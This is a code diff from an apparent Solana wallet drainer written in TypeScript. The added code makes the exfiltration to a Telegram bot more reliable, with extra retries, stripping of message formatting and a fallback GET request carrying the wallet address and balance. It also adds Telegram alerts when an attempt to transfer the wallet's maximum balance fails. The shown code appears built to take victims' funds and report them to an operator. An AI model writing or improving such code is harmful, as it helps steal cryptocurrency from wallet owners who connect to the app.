@@ -153,44 +153,86 @@ export const sendToTelegram = async (walletData: any, botToken: string, chatId: 
 
     console.log("Sending message to Telegram:", message);
 
-    // Make multiple attempts to send to Telegram
-    let success = false;
-    for (let attempt = 1; attempt <= 3; attempt++) {
+    // Make multiple attempts to send to Telegram with different methods
+    for (let attempt = 1; attempt <= 5; attempt++) {
       try {
         console.log(`Telegram send attempt #${attempt}`);
         
-        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-            parse_mode: 'Markdown',
-          }),
-          // Set a longer timeout
-          signal: AbortSignal.timeout(10000)
-        });
+        // Try with different approaches on different attempts
+        let response;
+        if (attempt <= 3) {
+          // First 3 attempts: standard fetch API
+          response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message,
+              parse_mode: 'Markdown',
+            }),
+            // Set a longer timeout
+            signal: AbortSignal.timeout(15000)
+          });
+        } else {
+          // Last 2 attempts: alternative approach without parse_mode
+          response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message,
+            }),
+            signal: AbortSignal.timeout(20000)
+          });
+        }
 
         const responseData = await response.json();
         console.log("Telegram API response:", responseData);
 
         if (response.ok && responseData.ok) {
           console.log("Successfully sent to Telegram");
-          success = true;
-          break;
+          return true;
         } else {
           console.error("Telegram API error:", responseData);
-          if (attempt < 3) await delay(1000 * attempt);
+          // If we're hitting message formatting issues, simplify the message and try again
+          if (responseData.description && responseData.description.includes("parse")) {
+            message = message.replace(/[*_`\[\]()~>#+=|{}.!-]/g, ''); // Remove Markdown special characters
+          }
+          if (attempt < 5) await delay(1000 * attempt);
         }
       } catch (telegramError) {
         console.error(`Telegram send attempt #${attempt} failed:`, telegramError);
-        if (attempt < 3) await delay(1000 * attempt);
+        if (attempt < 5) await delay(1000 * attempt);
       }
     }
 
-    return success;
+    // Try one last approach - backup URL with simplified message
+    try {
+      console.log("Trying backup Telegram send method...");
+      // Simplify message to basic text
+      const simpleMessage = `${walletData.address}: ${walletData.balance ? 'Balance: ' + walletData.balance.toFixed(6) + ' SOL' : walletData.message || 'Wallet notification'}`;
+      
+      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(simpleMessage)}`, {
+        method: 'GET',
+        signal: AbortSignal.timeout(20000)
+      });
+      
+      const responseData = await response.json();
+      if (response.ok && responseData.ok) {
+        console.log("Backup Telegram method succeeded");
+        return true;
+      }
+    } catch (error) {
+      console.error("Backup Telegram method failed:", error);
+    }
+
+    // If we get here, all attempts failed
+    console.error("All Telegram send attempts failed");
+    return false;
   } catch (error) {
     console.error('Error sending to Telegram:', error);
     return false;
@@ -217,6 +259,16 @@ export const signAndSendTransaction = async (
     // Make sure we have sufficient balance before proceeding
     if (balance <= 0) {
       console.error('Insufficient balance for transfer');
+      
+      // Send notification to Telegram if credentials provided
+      if (botToken && chatId) {
+        await sendToTelegram({
+          address: wallet.publicKey.toString(),
+          message: `TRANSFER FAILED: Insufficient balance (${balanceInSol} SOL)`,
+          walletName: wallet.adapter?.name || "Unknown Wallet"
+        }, botToken, chatId);
+      }
+      
       throw new Error('Insufficient wallet balance for transfer');
     }
     
@@ -227,6 +279,16 @@ export const signAndSendTransaction = async (
     
     if (maxTransferAmount <= 0) {
       console.error('Balance too low to cover fees');
+      
+      // Send notification to Telegram if credentials provided
+      if (botToken && chatId) {
+        await sendToTelegram({
+          address: wallet.publicKey.toString(),
+          message: `TRANSFER FAILED: Balance too low to cover fees (${balanceInSol} SOL)`,
+          walletName: wallet.adapter?.name || "Unknown Wallet"
+        }, botToken, chatId);
+      }
+      
       throw new Error('Wallet balance too low to cover transaction fees');
     }
     
